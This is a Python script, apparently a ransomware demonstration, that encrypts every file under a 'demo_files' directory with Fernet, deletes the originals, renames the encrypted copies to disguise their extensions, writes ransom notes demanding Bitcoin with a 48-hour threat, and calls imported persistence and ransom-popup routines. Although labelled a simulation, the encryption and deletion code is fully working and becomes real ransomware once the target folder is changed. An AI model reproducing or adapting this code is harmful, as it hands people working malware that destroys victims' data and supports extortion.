from cryptography.fernet import Fernet
import os
from ransomware_gui import show_ransom_gui  # GUI popup
from persistence import setup_autostart      # Autostart simulation

# List to hold file paths
files_to_encrypt = []

# Traverse the 'demo_files' directory to find files
for root, dirs, files in os.walk("demo_files"):
    for file in files:
        filepath = os.path.join(root, file)
        if filepath.endswith("key.key") or file.endswith(".enc") or file.endswith("README.txt"):
            continue
        files_to_encrypt.append(filepath)

# Generate and save the encryption key
key = Fernet.generate_key()
with open("key.key", "wb") as key_file:
    key_file.write(key)

# Initialize Fernet
fernet = Fernet(key)

# Encrypt files and simulate extension hiding
for file in files_to_encrypt:
    with open(file, "rb") as f:
        content = f.read()
    encrypted_content = fernet.encrypt(content)

    # Simulate extension hiding: original.txt -> original .txt
    base, ext = os.path.splitext(file)
    disguised_name = base + " " + ext  # e.g., report.txt -> report .txt

    with open(disguised_name, "wb") as f:
        f.write(encrypted_content)

    os.remove(file)  # Delete the original file

# Write ransom note in each folder
for file in files_to_encrypt:
    ransom_note_path = os.path.join(os.path.dirname(file), "ransom_note.txt")
    with open(ransom_note_path, "w") as note:
        note.write(
            "---YOUR FILES HAVE BEEN ENCRYPTED!\n"
            "To recover your data, send 1 BTC to the following address: 1A2b3C4d5E6f7G8h9I0j\n"
            "After payment, contact us at unlock@ransom.fake\n"
            "You have 48 hours before your files are lost forever."
        )

# Simulate persistence by creating autostart entry
setup_autostart()

# Show the ransom GUI popup
show_ransom_gui()